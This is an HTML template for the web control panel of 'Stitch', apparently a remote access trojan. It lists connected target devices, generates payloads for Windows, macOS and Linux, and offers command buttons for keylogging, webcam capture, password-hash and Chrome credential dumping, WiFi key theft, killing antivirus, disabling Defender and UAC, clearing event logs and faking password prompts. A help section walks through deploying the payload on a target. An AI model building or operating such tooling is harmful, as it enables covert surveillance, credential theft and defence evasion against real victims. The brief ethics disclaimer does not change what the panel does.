<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stitch Web Interface</title>
    <link rel="icon" type="image/svg+xml" href="{{ url_for('static', filename='favicon.svg') }}">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/modern_dashboard.css') }}">
    <script nonce="{{ g.csp_nonce }}" src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
</head>
<body>
    <div class="dashboard">
        <nav class="sidebar">
            <div class="sidebar-header">
                <h2>‚ö° STITCH</h2>
                <p class="version">Web Interface v1.0</p>
            </div>
            
            <ul class="nav-menu">
                <li><a href="#" class="nav-link active" data-section="connections">
                    <span>üîå</span> Connections
                </a></li>
                <li><a href="#" class="nav-link" data-section="commands">
                    <span>‚ö°</span> Commands
                </a></li>
                <li><a href="#" class="nav-link" data-section="payloads">
                    <span>üì¶</span> Payloads
                </a></li>
                <li><a href="#" class="nav-link" data-section="files">
                    <span>üìÅ</span> Files
                </a></li>
                <li><a href="#" class="nav-link" data-section="logs">
                    <span>üìã</span> Debug Logs
                </a></li>
                <li><a href="#" class="nav-link" data-section="help">
                    <span>‚ùì</span> Help
                </a></li>
            </ul>
            
            <div class="sidebar-footer">
                <div class="connection-status">
                    <span class="status-dot" id="serverStatus"></span>
                    <span id="statusText">Connecting...</span>
                </div>
                <a href="{{ url_for('logout') }}" class="logout-btn">Logout</a>
            </div>
        </nav>
        
        <main class="main-content">
            <div class="info-banner">
                <strong>üí° Pro Tip:</strong> For full command execution and payload generation, use the Terminal tab to access the Stitch CLI. The web interface provides monitoring, file management, and guided workflows!
            </div>
            
            <section id="connections-section" class="content-section active">
                <div class="section-header">
                    <h1>Connection History</h1>
                    <p>View devices that have connected to Stitch</p>
                </div>
                
                <div class="connections-grid" id="connectionsGrid">
                    <div class="empty-state">
                        <p>üîç No active connections</p>
                        <p class="help-text">Connections will appear here when devices connect to port 4040</p>
                    </div>
                </div>
            </section>
            
            <section id="commands-section" class="content-section">
                <div class="section-header">
                    <h1>Command Interface</h1>
                    <p>Execute commands on connected devices</p>
                </div>
                
                <div class="command-interface">
                    <div class="connection-selector">
                        <label for="commandConnection">Select Connection:</label>
                        <select id="commandConnection">
                            <option value="">No connections available</option>
                        </select>
                    </div>
                    
                    <div class="command-categories">
                        <button class="cat-btn" data-category="system">System Info</button>
                        <button class="cat-btn" data-category="files">File Operations</button>
                        <button class="cat-btn" data-category="network">Network</button>
                        <button class="cat-btn" data-category="security">Security & Stealth</button>
                        <button class="cat-btn" data-category="windows">Windows Only</button>
                        <button class="cat-btn" data-category="macos">macOS/Linux</button>
                        <button class="cat-btn" data-category="admin">Administrative</button>
                        <button class="cat-btn" data-category="custom">Custom Command</button>
                    </div>
                    
                    <div id="systemCommands" class="command-group">
                        <h3>System Information Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="sysinfo" data-help="Get complete system information including OS, hardware, network">
                                System Info
                            </button>
                            <button class="cmd-btn" data-cmd="environment" data-help="Display all environment variables">
                                Environment
                            </button>
                            <button class="cmd-btn" data-cmd="ps" data-help="List all running processes">
                                Processes (ps)
                            </button>
                            <button class="cmd-btn" data-cmd="lsmod" data-help="List installed drivers/kernel modules">
                                List Drivers
                            </button>
                            <button class="cmd-btn" data-cmd="drives" data-help="Display information about all drives">
                                Drives Info
                            </button>
                            <button class="cmd-btn" data-cmd="location" data-help="Get public IP and geo-location estimate">
                                Location
                            </button>
                            <button class="cmd-btn" data-cmd="vmscan" data-help="Detect if system is a virtual machine">
                                VM Detection
                            </button>
                            <button class="cmd-btn" data-cmd="pwd" data-help="Print working directory">
                                Current Dir (pwd)
                            </button>
                            <button class="cmd-btn" data-cmd="ls" data-help="List files and directories">
                                List Files (ls)
                            </button>
                        </div>
                    </div>
                    
                    <div id="filesCommands" class="command-group" style="display:none;">
                        <h3>File Operation Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="download" data-help="Download a file/directory from target">
                                Download
                            </button>
                            <button class="cmd-btn" data-cmd="upload" data-help="Upload a file/directory to target">
                                Upload
                            </button>
                            <button class="cmd-btn" data-cmd="cat" data-help="Display file contents">
                                View File (cat)
                            </button>
                            <button class="cmd-btn" data-cmd="more" data-help="Display file output">
                                More
                            </button>
                            <button class="cmd-btn" data-cmd="touch" data-help="Create empty file">
                                Create File (touch)
                            </button>
                            <button class="cmd-btn" data-cmd="fileinfo" data-help="Display detailed file information">
                                File Info
                            </button>
                            <button class="cmd-btn" data-cmd="hide" data-help="Hide a file or directory">
                                Hide File/Dir
                            </button>
                            <button class="cmd-btn" data-cmd="unhide" data-help="Unhide a file or directory">
                                Unhide File/Dir
                            </button>
                            <button class="cmd-btn" data-cmd="editaccessed" data-help="Edit file 'Accessed' timestamp">
                                Edit Accessed
                            </button>
                            <button class="cmd-btn" data-cmd="editcreated" data-help="Edit file 'Created' timestamp">
                                Edit Created
                            </button>
                            <button class="cmd-btn" data-cmd="editmodified" data-help="Edit file 'Modified' timestamp">
                                Edit Modified
                            </button>
                            <button class="cmd-btn" data-cmd="cd" data-help="Change directory">
                                Change Dir (cd)
                            </button>
                        </div>
                    </div>
                    
                    <div id="networkCommands" class="command-group" style="display:none;">
                        <h3>Network Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="ipconfig" data-help="Display network interface configuration">
                                IP Config
                            </button>
                            <button class="cmd-btn" data-cmd="ifconfig" data-help="Display network interface configuration (Unix)">
                                IF Config
                            </button>
                            <button class="cmd-btn" data-cmd="firewall status" data-help="Check firewall status">
                                Firewall Status
                            </button>
                            <button class="cmd-btn" data-cmd="firewall open" data-help="Open firewall port">
                                Open Port
                            </button>
                            <button class="cmd-btn" data-cmd="firewall close" data-help="Close firewall port">
                                Close Port
                            </button>
                            <button class="cmd-btn" data-cmd="hostsfile show" data-help="Display hosts file contents">
                                Show Hosts
                            </button>
                            <button class="cmd-btn" data-cmd="hostsfile update" data-help="Update hosts file entry">
                                Update Hosts
                            </button>
                            <button class="cmd-btn" data-cmd="hostsfile remove" data-help="Remove hosts file entry">
                                Remove Hosts
                            </button>
                            <button class="cmd-btn" data-cmd="ssh" data-help="Open SSH connection">
                                SSH Connect
                            </button>
                        </div>
                    </div>
                    
                    <div id="securityCommands" class="command-group" style="display:none;">
                        <h3>Security & Stealth Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="keylogger status" data-help="Check keylogger status">
                                Keylogger Status
                            </button>
                            <button class="cmd-btn" data-cmd="keylogger start" data-help="Start keylogger">
                                Start Keylogger
                            </button>
                            <button class="cmd-btn" data-cmd="keylogger stop" data-help="Stop keylogger">
                                Stop Keylogger
                            </button>
                            <button class="cmd-btn" data-cmd="keylogger dump" data-help="Dump recorded keystrokes">
                                Dump Keystrokes
                            </button>
                            <button class="cmd-btn" data-cmd="screenshot" data-help="Capture screenshot of screen">
                                Screenshot
                            </button>
                            <button class="cmd-btn" data-cmd="webcamlist" data-help="List connected webcams">
                                List Webcams
                            </button>
                            <button class="cmd-btn" data-cmd="webcamsnap" data-help="Take webcam picture">
                                Webcam Snap
                            </button>
                            <button class="cmd-btn" data-cmd="avscan" data-help="Scan for antivirus software">
                                AV Scan
                            </button>
                            <button class="cmd-btn" data-cmd="avkill" data-help="Terminate antivirus processes">
                                Kill AV
                            </button>
                            <button class="cmd-btn" data-cmd="hashdump" data-help="Grab password hashes">
                                Hash Dump
                            </button>
                            <button class="cmd-btn" data-cmd="wifikeys" data-help="Display saved WiFi passwords">
                                WiFi Keys
                            </button>
                            <button class="cmd-btn" data-cmd="freeze status" data-help="Check mouse/keyboard freeze status">
                                Freeze Status
                            </button>
                            <button class="cmd-btn" data-cmd="freeze start" data-help="Freeze mouse and keyboard">
                                Freeze Input
                            </button>
                            <button class="cmd-btn" data-cmd="freeze stop" data-help="Unfreeze mouse and keyboard">
                                Unfreeze Input
                            </button>
                            <button class="cmd-btn" data-cmd="popup" data-help="Display custom popup message">
                                Show Popup
                            </button>
                            <button class="cmd-btn" data-cmd="displayoff" data-help="Turn off display monitors">
                                Display Off
                            </button>
                            <button class="cmd-btn" data-cmd="displayon" data-help="Turn on display monitors">
                                Display On
                            </button>
                            <button class="cmd-btn" data-cmd="lockscreen" data-help="Lock the system screen">
                                Lock Screen
                            </button>
                            <button class="cmd-btn" data-cmd="logintext" data-help="Set login screen text">
                                Login Text
                            </button>
                        </div>
                    </div>
                    
                    <div id="windowsCommands" class="command-group" style="display:none;">
                        <h3>Windows-Specific Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="chromedump" data-help="Retrieve Chrome saved passwords">
                                Chrome Dump
                            </button>
                            <button class="cmd-btn" data-cmd="clearev" data-help="Clear Windows event logs">
                                Clear Event Logs
                            </button>
                            <button class="cmd-btn" data-cmd="scanreg" data-help="Display Windows Registry info">
                                Scan Registry
                            </button>
                            <button class="cmd-btn" data-cmd="disableRDP" data-help="Disable Remote Desktop Protocol">
                                Disable RDP
                            </button>
                            <button class="cmd-btn" data-cmd="enableRDP" data-help="Enable Remote Desktop Protocol">
                                Enable RDP
                            </button>
                            <button class="cmd-btn" data-cmd="disableUAC" data-help="Disable User Account Control">
                                Disable UAC
                            </button>
                            <button class="cmd-btn" data-cmd="enableUAC" data-help="Enable User Account Control">
                                Enable UAC
                            </button>
                            <button class="cmd-btn" data-cmd="disableWindef" data-help="Disable Windows Defender">
                                Disable Defender
                            </button>
                            <button class="cmd-btn" data-cmd="enableWindef" data-help="Enable Windows Defender">
                                Enable Defender
                            </button>
                        </div>
                    </div>
                    
                    <div id="macosCommands" class="command-group" style="display:none;">
                        <h3>macOS/Linux Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="askpassword" data-help="Display password prompt to user">
                                Ask Password
                            </button>
                            <button class="cmd-btn" data-cmd="crackpassword" data-help="Crack sudo password via dictionary attack">
                                Crack Password
                            </button>
                        </div>
                    </div>
                    
                    <div id="adminCommands" class="command-group" style="display:none;">
                        <h3>Administrative Commands</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" data-cmd="listen" data-help="Listen for incoming connections on a port">
                                Listen
                            </button>
                            <button class="cmd-btn" data-cmd="connect" data-help="Connect to a target host and port">
                                Connect
                            </button>
                            <button class="cmd-btn" data-cmd="sessions" data-help="Display available sessions">
                                Show Sessions
                            </button>
                            <button class="cmd-btn" data-cmd="shell" data-help="Open shell for specific session">
                                Open Shell
                            </button>
                            <button class="cmd-btn" data-cmd="history" data-help="View connection history">
                                View History
                            </button>
                            <button class="cmd-btn" data-cmd="history_remove" data-help="Remove from history">
                                Remove History
                            </button>
                            <button class="cmd-btn" data-cmd="sudo" data-help="Execute command with admin privileges">
                                Sudo Command
                            </button>
                            <button class="cmd-btn" data-cmd="pyexec" data-help="Execute Python script on target">
                                Python Exec
                            </button>
                            <button class="cmd-btn" data-cmd="run" data-help="Start a file or application">
                                Run/Start File
                            </button>
                            <button class="cmd-btn" data-cmd="addkey" data-help="Add AES encryption key">
                                Add AES Key
                            </button>
                            <button class="cmd-btn" data-cmd="showkey" data-help="Display active AES key">
                                Show AES Key
                            </button>
                            <button class="cmd-btn" data-cmd="stitchgen" data-help="Generate Stitch payloads">
                                Generate Payload
                            </button>
                            <button class="cmd-btn" data-cmd="cls" data-help="Clear the screen">
                                Clear Screen (cls)
                            </button>
                            <button class="cmd-btn" data-cmd="home" data-help="Display Stitch banner">
                                Show Banner (home)
                            </button>
                            <button class="cmd-btn" data-cmd="exit" data-help="Exit the current session">
                                Exit
                            </button>
                        </div>
                    </div>
                    
                    <div id="customCommands" class="command-group" style="display:none;">
                        <h3>Custom Command</h3>
                        <div class="custom-command-input">
                            <input type="text" id="customCommand" placeholder="Enter custom command...">
                            <button class="btn btn-primary" id="executeCustom">Execute</button>
                        </div>
                    </div>
                    
                    <div class="command-output">
                        <div class="output-header">
                            <h3>Command Output</h3>
                            <button id="clearOutput" class="btn btn-sm">Clear</button>
                        </div>
                        <pre id="commandOutput">Ready to execute commands...</pre>
                    </div>
                </div>
            </section>
            
            <section id="payloads-section" class="content-section">
                <div class="section-header">
                    <h1>Payload Generation</h1>
                    <p>Create payloads for different operating systems</p>
                </div>
                
                <div class="payload-generator">
                    <div class="payload-form">
                        <div class="form-group">
                            <label for="osType">Operating System</label>
                            <select id="osType">
                                <option value="windows">Windows</option>
                                <option value="macos">macOS</option>
                                <option value="linux">Linux</option>
                            </select>
                            <p class="help-text">Target operating system for the payload</p>
                        </div>
                        
                        <div class="form-group">
                            <label for="payloadHost">Host/IP</label>
                            <input type="text" id="payloadHost" value="0.0.0.0" placeholder="IP or hostname">
                            <p class="help-text">IP address or hostname where Stitch server is running</p>
                        </div>
                        
                        <div class="form-group">
                            <label for="payloadPort">Port</label>
                            <input type="number" id="payloadPort" value="4040" placeholder="4040">
                            <p class="help-text">Port number for connection (default: 4040)</p>
                        </div>
                        
                        <button id="generatePayload" class="btn btn-primary btn-large">
                            üì¶ Generate Payload
                        </button>
                    </div>
                    
                    <div class="payload-output">
                        <h3>Generated Payloads</h3>
                        <div id="payloadsList" class="payloads-list">
                            <p class="empty-state">No payloads generated yet</p>
                        </div>
                    </div>
                </div>
            </section>
            
            <section id="files-section" class="content-section">
                <div class="section-header">
                    <h1>File Management</h1>
                    <p>Manage downloaded files</p>
                </div>
                
                <div class="files-container">
                    <div class="files-toolbar">
                        <button id="refreshFiles" class="btn btn-secondary">üîÑ Refresh</button>
                    </div>
                    
                    <table class="files-table">
                        <thead>
                            <tr>
                                <th>Filename</th>
                                <th>Size</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="filesList">
                            <tr>
                                <td colspan="4" class="empty-state">No files available</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            
            <section id="logs-section" class="content-section">
                <div class="section-header">
                    <h1>Debug Logs</h1>
                    <p>Real-time system logs and debugging information</p>
                </div>
                
                <div class="logs-container">
                    <div class="logs-toolbar">
                        <button id="clearLogs" class="btn btn-secondary">Clear Logs</button>
                        <label>
                            <input type="checkbox" id="autoScroll" checked> Auto-scroll
                        </label>
                    </div>
                    
                    <div class="logs-output" id="logsOutput">
                        <div class="log-entry log-info">
                            <span class="log-time">{{ "now"|string }}</span>
                            <span class="log-level">INFO</span>
                            <span class="log-message">System initialized</span>
                        </div>
                    </div>
                </div>
            </section>
            
            <section id="help-section" class="content-section">
                <div class="section-header">
                    <h1>Help & Documentation</h1>
                    <p>Learn how to use Stitch effectively</p>
                </div>
                
                <div class="help-content">
                    <div class="help-card">
                        <h3>üöÄ Getting Started</h3>
                        <ol>
                            <li><strong>Generate a Payload:</strong> Use the Payloads section to create an executable for your target OS</li>
                            <li><strong>Deploy Payload:</strong> Run the payload on the target system</li>
                            <li><strong>Monitor Connections:</strong> Active connections appear in the Connections section</li>
                            <li><strong>Execute Commands:</strong> Use the Commands section to interact with connected systems</li>
                        </ol>
                    </div>
                    
                    <div class="help-card">
                        <h3>üìã Complete Command Reference</h3>
                        <p><strong>70+ Commands Available! Organized by category:</strong></p>
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-top: 15px;">
                            <div>
                                <h4>System Info (9)</h4>
                                <small>sysinfo, environment, ps, lsmod, drives, location, vmscan, pwd, ls</small>
                            </div>
                            <div>
                                <h4>File Operations (12)</h4>
                                <small>download, upload, cat, more, touch, fileinfo, hide, unhide, edit timestamps, cd</small>
                            </div>
                            <div>
                                <h4>Network (9)</h4>
                                <small>ipconfig/ifconfig, firewall (status/open/close), hostsfile (show/update/remove), ssh</small>
                            </div>
                            <div>
                                <h4>Security & Stealth (18)</h4>
                                <small>keylogger, screenshot, webcam, avscan, avkill, hashdump, wifikeys, freeze, popup, display, lockscreen, logintext</small>
                            </div>
                            <div>
                                <h4>Windows Only (9)</h4>
                                <small>chromedump, clearev, scanreg, RDP, UAC, Windows Defender controls</small>
                            </div>
                            <div>
                                <h4>macOS/Linux (2)</h4>
                                <small>askpassword, crackpassword</small>
                            </div>
                            <div>
                                <h4>Administrative (10)</h4>
                                <small>sudo, pyexec, run/start, sessions, shell, history, AES keys, stitchgen</small>
                            </div>
                            <div>
                                <h4>Other Commands</h4>
                                <small>cls/clear (clear screen), home (banner), connect, listen, exit</small>
                            </div>
                        </div>
                    </div>
                    
                    <div class="help-card warning">
                        <h3>‚ö†Ô∏è Security & Ethics</h3>
                        <p><strong>IMPORTANT:</strong> Stitch is for educational and research purposes only.</p>
                        <ul>
                            <li>Only use on systems you own or have explicit permission to test</li>
                            <li>Never use for malicious purposes</li>
                            <li>Check local laws regarding penetration testing tools</li>
                            <li>The authors take no responsibility for misuse</li>
                        </ul>
                    </div>
                    
                    <div class="help-card">
                        <h3>üîß Configuration</h3>
                        <p><strong>Server Settings:</strong></p>
                        <ul>
                            <li>Port: 4040 (default, configurable)</li>
                            <li>Encryption: AES-256 (automatic)</li>
                            <li>Auto-generated on first run (no manual config needed)</li>
                        </ul>
                        <p><strong>Default Credentials:</strong></p>
                        <ul>
                            <li>Username: admin</li>
                            <li>Password: stitch2024</li>
                            <li class="warning">‚ö†Ô∏è Change these in production!</li>
                        </ul>
                    </div>
                </div>
            </section>
        </main>
    </div>
    
    <script nonce="{{ g.csp_nonce }}" src="{{ url_for('static', filename='js/app.js') }}"></script>
</body>
</html>
